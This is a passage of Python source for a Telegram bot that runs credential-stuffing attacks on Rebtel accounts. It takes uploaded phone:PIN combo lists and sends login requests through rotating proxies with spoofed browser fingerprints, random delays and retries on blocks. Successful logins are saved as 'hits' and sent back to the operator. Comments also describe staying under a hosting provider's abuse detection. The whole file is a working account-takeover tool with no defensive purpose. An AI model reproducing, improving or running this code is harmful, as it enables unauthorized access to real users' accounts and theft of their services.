            f"Dead proxies will be dropped naturally during /check via the "
            f"existing retry logic. If you really want to pre-validate a "
            f"_small_ list (<= {VALIDATE_MAX_BATCH}), use `/setpr validate`.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    # ---- explicit 'validate' mode ----
    # Hard cap: validating more than VALIDATE_MAX_BATCH proxies in one shot
    # re-triggers the very abuse pattern that got this workspace banned. We
    # refuse and guide the user back to raw mode.
    if len(candidates) > VALIDATE_MAX_BATCH:
        clog(
            f"{Colors.YELLOW}[setpr] validate refused: {len(candidates)} > "
            f"cap {VALIDATE_MAX_BATCH} (would trip Railway ban){Colors.RESET}"
        )
        if not add:
            proxy_manager.clear()
        added = proxy_manager.add(candidates)
        final_pool = proxy_manager.count()
        await status.edit_text(
            f"*Validation refused* -- batch too large ({len(candidates)} > {VALIDATE_MAX_BATCH}).\n"
            f"Batch-validating thousands of proxies fans out thousands of "
            f"outbound TCP connections to distinct IPs from one Railway "
            f"container -- the exact pattern its abuse detector bans. The Go "
            f"reference would be banned too at this scale.\n\n"
            f"Falling back to raw mode. Added {added} proxies.\n"
            f"Pool size now: {final_pool}\n\n"
            f"Run `/check` next -- dead proxies drop out during the check via retries.",
            parse_mode=ParseMode.MARKDOWN,
        )
        return

    # Small batch -- proceed with validation.
    # For /setpr (replace mode), remember the old pool so we can restore it if
    # nothing works. We wipe the pool *before* validation begins so that we can
    # stream wins in immediately; if nothing passes, we restore the old pool.
    if not add:
        old_pool = proxy_manager.get_all()
        proxy_manager.clear()

    await status.edit_text(
        f"Validating {len(candidates)} proxies against `{PROXY_VALIDATE_URL}` ...\n"
        f"({PROXY_VALIDATE_WORKERS} workers, gentle pacing)\n"
        f"(proxies are added to the pool as soon as they pass)",
        parse_mode=ParseMode.MARKDOWN,
    )

    state = {"done": 0, "working": 0, "last_t": 0.0}

    def on_success(proxy_url: str) -> None:
        # Stream this proxy into the pool immediately and persist.
        proxy_manager.add_one(proxy_url)

    def progress(done, total, working):
        state["done"] = done
        state["working"] = working
        now = time.time()
        if now - state["last_t"] >= STATUS_EDIT_MIN_INTERVAL:
            state["last_t"] = now
            _threadsafe_send(_safe_edit_message(
                context,
                msg.chat_id,
                status.message_id,
                f"Validating proxies ... `{working}` working / `{done}`/`{total}` checked\n"
                f"Pool size now: {proxy_manager.count()}",
            ))

    # Run async validation fan-out directly (matches Go's per-goroutine model).
    await validate_proxies_async(
        candidates, progress_cb=progress, on_success=on_success,
    )

    done = state["done"]
    working_n = state["working"]
    final_pool = proxy_manager.count()

    if not add and working_n == 0:
        # Nothing passed -> restore the old pool so we don't leave the user naked.
        if old_pool:
            proxy_manager.replace(old_pool)
            final_pool = proxy_manager.count()
            text = (
                f"Validation done. *0* proxies worked out of {len(candidates)}.\n"
                f"Old pool restored ({final_pool} proxies kept)."
            )
        else:
            text = (
                f"Validation done. *0* proxies worked out of {len(candidates)}.\n"
                f"Pool is empty."
            )
    else:
        verb = "added to" if add else "replaced in"
        text = (
            f"Validation done.\n"
            f"Candidates: {len(candidates)}  Checked: {done}\n"
            f"Working: {working_n}  -> {verb} pool (streamed in real time)\n"
            f"Pool size now: {final_pool}"
        )
    await status.edit_text(text, parse_mode=ParseMode.MARKDOWN)


async def cmd_setpr(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await _do_setpr(update, context, add=False)


async def cmd_addpr(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await _do_setpr(update, context, add=True)


async def cmd_clearpr(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    n = proxy_manager.clear()
    clog(f"[cmd] /clearpr from chat={update.message.chat_id} user={update.effective_user} -> cleared {n}")
    await update.message.reply_text(f"Cleared proxy pool ({n} proxies removed).")


async def cmd_listpr(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    n = proxy_manager.count()
    clog(f"[cmd] /listpr from chat={update.message.chat_id} -> pool size {n}")
    await update.message.reply_text(f"Proxy pool size: *{n}*", parse_mode=ParseMode.MARKDOWN)


# --------------------------------------------------------------------------- #
#  /check
# --------------------------------------------------------------------------- #
def read_combos(text: str) -> List[Tuple[str, str]]:
    combos = []
    for line in text.splitlines():
        line = line.strip()
        if not line or ":" not in line:
            continue
        parts = line.split(":", 1)
        if len(parts) == 2:
            phone = parts[0].strip()
            pin = parts[1].strip()
            if phone and pin:
                combos.append((phone, pin))
    return combos


def _make_check_headers(content_type_json: bool = False) -> dict:
    """Build the exact header set used by the captured Chrome/150 Edg/150 flow.
    X-Timestamp is a fresh UTC timestamp per call, matching the capture."""
    h = {
        "Accept": "application/json, text/plain, */*",
        "Accept-Language": "en-US,en;q=0.9",
        "Authorization": REBTEL_AUTH_HEADER,
        "Cache-Control": "no-cache",
        "Connection": "keep-alive",
        "Origin": "https://my.rebtel.com",
        "Pragma": "no-cache",
        "Referer": "https://my.rebtel.com/",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "User-Agent": CHECK_USER_AGENT,
        "X-Timestamp": datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z",
        "sec-ch-ua": CHECK_SEC_CH_UA,
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Windows"',
    }
    if content_type_json:
        h["Content-Type"] = "application/json; charset=UTF-8"
    return h


def _step1_normalize(session, phone: str, proxy: Optional[str]) -> Optional[str]:
    """Step 1: GET /phonenumbers/normalize -> return the normalized endpoint
    (e.g. '+15012185735') or None on failure."""
    cid = detect_country_id(phone)
    try:
        resp = session.get(
            REBTEL_NORMALIZE_URL,
            params={"number": phone, "countryId": cid},
            headers=_make_check_headers(),
            proxy=proxy,
            timeout=20,
            impersonate=CHECK_IMPERSONATE,
        )
        if resp.status_code != 200:
            return None
        try:
            data = resp.json()
        except Exception:
            return None
        return data.get("endpoint") or None
    except Exception:
        return None


def _step2_create_user(session, normalized: str, proxy: Optional[str]) -> None:
    """Step 2: POST /v2/users. Fire-and-forget -- the 'user already exists'
    response (errorCode 40005) is expected and fine; we just need step 3 to
    be allowed to authenticate the existing user."""
    cid = detect_country_id(normalized)
    body = REBTEL_CREATE_USER_BODY.replace("__PHONE__", normalized).replace("__CID__", cid)
    try:
        session.post(
            REBTEL_USERS_URL,
            headers=_make_check_headers(content_type_json=True),
            data=body,
            proxy=proxy,
            timeout=20,
            impersonate=CHECK_IMPERSONATE,
        )
    except Exception:
        pass


def _step3_authenticate(session, normalized: str, pin: str, proxy: Optional[str]):
    """Step 3: POST /v2/users/number/{phone}/authentication.
    Returns the (status_code, body_text, body_json_or_None) tuple."""
    body = json.dumps({"password": pin, "voucher": None})
    try:
        resp = session.post(
            REBTEL_AUTH_URL.format(phone=normalized),
            headers=_make_check_headers(content_type_json=True),
            data=body,
            proxy=proxy,
            timeout=30,
            impersonate=CHECK_IMPERSONATE,
        )
    except Exception as e:
        return None, str(e), None
    body_text = resp.text or ""
    try:
        body_json = resp.json()
    except Exception:
        body_json = None
    return resp.status_code, body_text, body_json


def send_authentication_request(
    phone: str, pin: str, attempt: int, job: CheckJob, context: ContextTypes.DEFAULT_TYPE
) -> str:
    """3-step Rebtel flow: normalize -> create-user -> authenticate.

    Retry policy: on retryable failures (403/429/5xx, network errors) we retry
    steps 2 + 3 using the SAME normalized number (it's cached on the job for
    this combo) -- the user above confirmed normalize results can be reused.
    """
    if job.should_stop():
        return "stopped"

    proxy = None
    if job.use_proxy:
        proxy = proxy_manager.get_next_proxy(job.proxy_idx)
        if proxy is None:
            job.use_proxy = False
    proxy_short = (proxy or "direct").split("@")[-1] if proxy else "direct"

    if job.should_stop():
        return "stopped"

    # Pre-request jitter (gentler on retries).
    time.sleep(random.uniform(2, 5) if attempt == 1 else random.uniform(5, 10))
    if job.should_stop():
        return "stopped"

    session = cffi_requests.Session()

    # --- Step 1: normalize (only on first attempt; cache the result) ---
    cache_key = f"norm::{phone}"
    normalized = job.normalized_cache.get(cache_key) if hasattr(job, "normalized_cache") else None
    if normalized is None:
        normalized = _step1_normalize(session, phone, proxy)
        if normalized is None:
            # Normalize itself failed -> usually a bad proxy / network. Retryable.
            clog(
                f"{Colors.YELLOW}[chk {job.chat_id}] {phone}:{pin}  "
                f"NORMALIZE FAIL attempt={attempt} via={proxy_short}{Colors.RESET}"
            )
            with job.lock:
                job.checked += 1
                job.errors += 1
            _maybe_edit_status(job, context)
            if attempt < 3 and not job.should_stop():
                time.sleep(random.uniform(3, 6))
                if job.should_stop():
                    return "stopped"
                return send_authentication_request(phone, pin, attempt + 1, job, context)
            return "error"
        # Cache for retries of this same combo.
        if hasattr(job, "normalized_cache"):
            job.normalized_cache[cache_key] = normalized

    # --- Step 2: create user (fire-and-forget) ---
    _step2_create_user(session, normalized, proxy)
    if job.should_stop():
        return "stopped"

    # --- Step 3: authenticate ---
    status_code, body_text, body_json = _step3_authenticate(session, normalized, pin, proxy)
    if status_code is None:
        # Network/transport error.
        msg = (body_text or "")[:80] + ("..." if len(body_text or "") > 80 else "")
        clog(
            f"{Colors.YELLOW}[chk {job.chat_id}] {phone}:{pin}  "
            f"AUTH ERR attempt={attempt} via={proxy_short}: {msg}{Colors.RESET}"
        )
        with job.lock:
            job.checked += 1
            job.errors += 1
        _maybe_edit_status(job, context)
        if attempt < 3 and not job.should_stop():
            time.sleep(random.uniform(3, 6))
            if job.should_stop():
                return "stopped"
            return send_authentication_request(phone, pin, attempt + 1, job, context)
        return "error"

    retryable = status_code in (403, 429, 500, 502, 503, 504)
    is_hit = (status_code == 200 and isinstance(body_json, dict) and "authorization" in body_json)

    # ---- console log (every step-3 response) ----
    if is_hit:
        status_color = Colors.GREEN + f"{status_code} HIT" + Colors.RESET
    elif retryable:
        status_color = Colors.YELLOW + f"{status_code} RETRY" + Colors.RESET
    else:
        status_color = Colors.RED + f"{status_code} FAIL" + Colors.RESET
    clog(
        f"[chk {job.chat_id}] {phone}:{pin}  "
        f"status={status_color}  attempt={attempt}  via={proxy_short}"
    )

    if is_hit:
        body_pretty = json.dumps(body_json, indent=2)
        clog(f"{Colors.GREEN}{'='*50}{Colors.RESET}")
        clog(f"{Colors.GREEN}HIT! Phone: {phone}  PIN: {pin}  (normalized {normalized}){Colors.RESET}")
        clog(body_pretty)
        clog(f"{Colors.GREEN}{'='*50}{Colors.RESET}")
        record = (
            f"{'='*50}\n"
            f"SUCCESS - {datetime.now()}\n"
            f"Phone: {phone}\n"
            f"Normalized: {normalized}\n"
            f"Password: {pin}\n"
            f"Response: {body_pretty}\n"
            f"{'='*50}\n\n"
        )
        with job.lock:
            job.hits += 1
            job.checked += 1
            job.hits_lines.append(f"{phone}:{pin}")
            # Persist on disk immediately so a crash never loses the hit.
            try:
                with open(job.hits_filename, "a", encoding="utf-8") as fh:
                    fh.write(record)
            except Exception:
                pass
        _threadsafe_send(_safe_send_message(
            context,
            job.chat_id,
            f"*HIT* `{phone}:{pin}`\nNormalized: `{normalized}`\nStatus: 200\n```{body_pretty[:1500]}```",
        ))
        _maybe_edit_status(job, context)
        return "hit"

    # Non-hit: log body preview and classify.
    body_preview = (body_text or "")[:200].replace("\n", " ")
    clog(f"  resp: {body_preview}")
    with job.lock:
        job.checked += 1
        if retryable:
            job.errors += 1
        else:
            job.fails += 1
    _maybe_edit_status(job, context)
    if retryable and attempt < 3:
        time.sleep(random.uniform(5, 10))
        if job.should_stop():
            return "stopped"
        return send_authentication_request(phone, pin, attempt + 1, job, context)
    return "fail"


def _maybe_edit_status(job: CheckJob, context: ContextTypes.DEFAULT_TYPE) -> None:
    now = time.time()
    with job.lock:
        if now - job.last_edit < STATUS_EDIT_MIN_INTERVAL:
            return
        job.last_edit = now
    _threadsafe_send(_safe_edit_message(context, job.chat_id, job.status_msg_id, status_text(job)))


def _run_check(job: CheckJob, combos: List[Tuple[str, str]], context: ContextTypes.DEFAULT_TYPE) -> None:
    """Blocking function that runs the checker with a thread pool."""
    clog(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
    clog(f"{Colors.CYAN}CHECK START  chat={job.chat_id}  combos={len(combos)}  "
         f"threads={job.threads}  proxy={'yes' if job.use_proxy else 'no'}{Colors.RESET}")
    clog(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
    workers = min(job.threads, max(1, len(combos)))
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = [ex.submit(send_authentication_request, ph, pn, 1, job, context) for ph, pn in combos]
        for _ in concurrent.futures.as_completed(futs):
            if job.should_stop():
                break
        if job.should_stop():
            for f in futs:
                f.cancel()
    # Summary
    elapsed = time.time() - job.start_time
    rate = job.checked / elapsed if elapsed > 0 else 0.0
    clog(f"{Colors.BOLD}{Colors.CYAN}{'='*60}{Colors.RESET}")
    clog(f"{Colors.BOLD}{Colors.CYAN}CHECK DONE  chat={job.chat_id}{Colors.RESET}")
    clog(f"  Checked: {job.checked}/{job.total}")
    clog(f"  {Colors.GREEN}Hits: {job.hits}{Colors.RESET}   "
         f"{Colors.RED}Fails: {job.fails}{Colors.RESET}   "
         f"{Colors.YELLOW}Errors: {job.errors}{Colors.RESET}")
    clog(f"  Time: {_format_eta(elapsed)}   Rate: {rate:.2f}/s")
    clog(f"{Colors.BOLD}{Colors.CYAN}{'='*60}{Colors.RESET}")
    if job.hits_lines:
        clog(f"{Colors.GREEN}Hits list ({job.hits}):{Colors.RESET}")
        for h in job.hits_lines:
            clog(f"  {Colors.GREEN}{h}{Colors.RESET}")


async def cmd_check(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    msg = update.message
    chat_id = msg.chat_id
    clog(f"[cmd] /check from chat={chat_id} user={update.effective_user} args={context.args}")

    # Reject if a job is already running for this chat.
    with active_jobs_lock:
        if chat_id in active_jobs and not active_jobs[chat_id].should_stop():
            await msg.reply_text("A check is already running for this chat. Use /stop first.")
            return

    if msg.reply_to_message is None:
        await msg.reply_text("Reply `/check [threads]` to a `.txt` file of `phone:pin` combos.", parse_mode=ParseMode.MARKDOWN)
        return

    data, filename = await download_replied_file(update, context)
    if data is None:
        await msg.reply_text("Could not download a file from the replied message.")
        return
    text = data.decode("utf-8", errors="ignore")
    combos = read_combos(text)
    if not combos:
        await msg.reply_text("No `phone:pin` combos found in that file.", parse_mode=ParseMode.MARKDOWN)
        return

    # Threads argument.
    threads = DEFAULT_THREADS
    if context.args:
        try:
            threads = int(context.args[0])
        except ValueError:
            await msg.reply_text(f"Invalid thread count. Using default {DEFAULT_THREADS}.")
            threads = DEFAULT_THREADS
    threads = max(1, min(threads, MAX_THREADS))

    pool_n = proxy_manager.count()
    if pool_n > 0 and not SKIP_POOL_REVERIFY:
        status_msg = await msg.reply_text(
            f"Re-verifying {pool_n} proxies from the pool before checking...",
            parse_mode=ParseMode.MARKDOWN,
        )
        rv_state = {"done": 0, "working": 0, "last_t": 0.0}

        def rv_progress(done, total, working):
            rv_state["done"] = done
            rv_state["working"] = working
            now = time.time()
            if now - rv_state["last_t"] >= STATUS_EDIT_MIN_INTERVAL:
                rv_state["last_t"] = now
                _threadsafe_send(_safe_edit_message(
                    context,
                    chat_id,
                    status_msg.message_id,
                    f"Re-verifying pool ... `{working}` alive / `{done}`/`{total}` checked",
                ))

        current_pool = proxy_manager.get_all()
        working_after = await validate_proxies_async(
            current_pool, progress_cb=rv_progress,
        )
        working_set = set(working_after)
        dead = [p for p in current_pool if p not in working_set]
        for d in dead:
            proxy_manager.remove(d)

        pool_n = proxy_manager.count()
        await status_msg.edit_text(
            f"Pool re-verified. Working: {pool_n}  Dead removed: {len(dead)}.",
            parse_mode=ParseMode.MARKDOWN,
        )
        if pool_n == 0:
            await msg.reply_text(
                "No working proxies left in the pool after re-verification.\n"
                "Add proxies with /setpr or /addpr, or run without a pool."
            )
    elif pool_n > 0 and SKIP_POOL_REVERIFY:
        await msg.reply_text(
            f"Using {pool_n} proxies from the pool (re-verify skipped). "
            f"Dead ones will drop out naturally during the check."
        )

    mode = f"Proxy ({pool_n} in pool)" if pool_n else "Proxyless"
    status_msg = await msg.reply_text(
        f"Starting check...\nCombos: {len(combos)}\nThreads: {threads}\nMode: {mode}",
        parse_mode=ParseMode.MARKDOWN,
    )

    job = CheckJob(chat_id=chat_id, total=len(combos), status_msg_id=status_msg.message_id, threads=threads)
    with active_jobs_lock:
        active_jobs[chat_id] = job

    loop = asyncio.get_running_loop()
    # Run the blocking checker in the default executor (a separate thread).
    try:
        await loop.run_in_executor(None, _run_check, job, combos, context)
    finally:
        # Final status update + send hits.txt.
        final = (
            f"*Check finished.*\n"
            f"Checked: {job.checked}/{job.total}\n"
            f"Hits: {job.hits}\nFails: {job.fails}\nErrors: {job.errors}\n"
            f"Time: {_format_eta(time.time() - job.start_time)}"
        )
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=status_msg.message_id, text=final, parse_mode=ParseMode.MARKDOWN
            )
        except Exception:
            pass
        # Send hits.txt as a document (in-memory).
        try:
            with open(job.hits_filename, "r", encoding="utf-8") as fh:
                content = fh.read()
        except Exception:
            content = "\n".join(job.hits_lines)
        bio = io.BytesIO(content.encode("utf-8"))
        out_name = f"hits_{chat_id}.txt"
        bio.name = out_name
        await context.bot.send_document(
            chat_id=chat_id,
            document=InputFile(bio, filename=out_name),
            caption=f"hits.txt ({job.hits} hits)",
        )
        with active_jobs_lock:
            active_jobs.pop(chat_id, None)
        try:
            os.remove(job.hits_filename)
        except Exception:
            pass


async def cmd_stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    chat_id = update.message.chat_id
    clog(f"[cmd] /stop from chat={chat_id} user={update.effective_user}")
    with active_jobs_lock:
        job = active_jobs.get(chat_id)
    if job is None or job.should_stop():
        await update.message.reply_text("No active check to stop for this chat.")
        return
    job.stop_event.set()
    await update.message.reply_text("Stop signal sent. In-flight requests will finish, new ones skipped.")


# --------------------------------------------------------------------------- #
#  Unknown text fallback
# --------------------------------------------------------------------------- #
async def cmd_unknown(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("Unknown command. See /help")


# --------------------------------------------------------------------------- #
#  Main
# --------------------------------------------------------------------------- #
def build_app() -> Application:
    app = ApplicationBuilder().token(BOT_TOKEN).post_init(post_init).build()
    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("clean", cmd_clean))
    app.add_handler(CommandHandler("check", cmd_check))
    app.add_handler(CommandHandler("stop", cmd_stop))
    app.add_handler(CommandHandler("setpr", cmd_setpr))
    app.add_handler(CommandHandler("addpr", cmd_addpr))
    app.add_handler(CommandHandler("clearpr", cmd_clearpr))
    app.add_handler(CommandHandler("listpr", cmd_listpr))
    app.add_handler(CommandHandler("pool", cmd_listpr))
    app.add_handler(MessageHandler(filters.COMMAND, cmd_unknown))
    return app


def main() -> None:
    app = build_app()
    n = proxy_manager.count()
    clog(f"{Colors.BOLD}{Colors.CYAN}Rebtel Telegram bot starting...{Colors.RESET}")
    clog(f"{Colors.CYAN}Loaded {n} proxies from {PROXY_POOL_FILE}{Colors.RESET}")
    clog(f"{Colors.CYAN}Token: {BOT_TOKEN[:12]}...{Colors.RESET}")
    app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
